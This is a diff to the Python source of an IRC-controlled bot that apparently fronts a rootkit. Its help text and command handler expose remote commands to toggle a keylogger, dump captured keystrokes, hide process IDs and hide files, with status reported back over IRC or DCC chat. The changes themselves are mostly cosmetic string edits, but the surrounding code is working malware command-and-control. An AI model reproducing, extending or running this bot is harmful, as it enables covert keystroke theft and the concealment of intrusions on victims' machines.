@@ -17,9 +17,9 @@ Bot commands are:
     	die -- Kill the bot.
 
     ROOT COMMANDS -------
-    	tls -- Toggle keylogger on/off. 
+    	tls -- Toggle keylogger listening on/off. 
     	keylog -- Print keyboard input log. 
-                  If keylogger is on, toggle will be set to 0.
+                  Keylogger is turned off.
     	hpXXXX -- Hide a process id.
     	sp -- Show the last hidden process.
     	thf -- Toggle files show/hide.
@@ -64,7 +64,7 @@ class Bot(irc.bot.SingleServerIRCBot):
         	c.join(self.channel)
 
 	def on_privmsg(self, c, e):
-        	self.do_command(e, e.arguments[0], c, dcc)
+        	self.do_command(e, e.arguments[0], c)
 
 	def on_pubmsg(self, c, e):
         	a = e.arguments[0].split(":", 1)
@@ -145,23 +145,23 @@ class Bot(irc.bot.SingleServerIRCBot):
 		else:
 			for chname, chobj in self.channels.items():
 				c.notice(chname, "--- Channel Statistics ---")
-				c.notice(chname, "channel: " + chname)
+				c.notice(chname, "Channel: " + chname)
 				users = chobj.users()
 				users.sort() 
-				c.notice(chname, "users: " + ", ".join(users))
+				c.notice(chname, "Users: " + ", ".join(users))
 				opers = chobj.opers()
 				opers.sort()
-				c.notice(chname, "opers: " + ", ".join(opers)) 
+				c.notice(chname, "Opers: " + ", ".join(opers)) 
 				voiced = chobj.voiced()
 				voiced.sort()
-				c.notice(chname, "voiced: " + ", ".join(voiced))
+				c.notice(chname, "Voiced: " + ", ".join(voiced))
 			if debug:
 				print "Retrieving channel stats."
 				print "--- Channel Statistics ---"
-				print "channel: " + chname
-				print "users: " + ", ".join(users)
-				print "opers: " + ", ".join(opers)
-				print "voiced: " + ", ".join(voiced)
+				print "Channel: " + chname
+				print "Users: " + ", ".join(users)
+				print "Opers: " + ", ".join(opers)
+				print "Voiced: " + ", ".join(voiced)
 	 
 	def _cmd_help(self, c, e, cmd, nick, dcc):
 		help_doc =  """
@@ -171,8 +171,8 @@ stats -- Print some channel information.
 disconnect -- Disconnect the bot from a DCC session. The bot will try to reconnect after 15 seconds.
 die -- Kill the bot.
 ROOT COMMANDS -------
-tls -- Toggle keylogger on/off. 
-keylog -- Print keyboard input log. If keylogger is on, toggle will be set to 0.
+tls -- Toggle keylogger listening on/off. 
+keylog -- Print keyboard input log. Keylogger is turned off.
 hpxxxx -- Hide a process id.
 sp -- Show the last hidden process.
 thf -- Toggle files show/hide.
@@ -219,7 +219,7 @@ ms -- Show the root module.
 			ip_quad_to_numstr(dcc.localaddress),
 			dcc.localport))
 			if debug:
-				print "dcc", nick, "chat chat %s %d" % (
+				print "dcc", nick, "CHAT chat %s %d" % (
 				ip_quad_to_numstr(dcc.localaddress), 					
 				dcc.localport)
    
@@ -227,7 +227,7 @@ ms -- Show the root module.
 		if cmd in self.valid_cmds or "hp" in cmd:
 	    		self.root_command(cmd)
             		status = self.root_status()
-			txt = "command %s executed." % cmd
+			txt = "Command %s executed." % cmd
 			self.print_irc(c, channel, txt, dcc)
             		for line in status:
 				self.print_irc(c, channel, line, dcc)
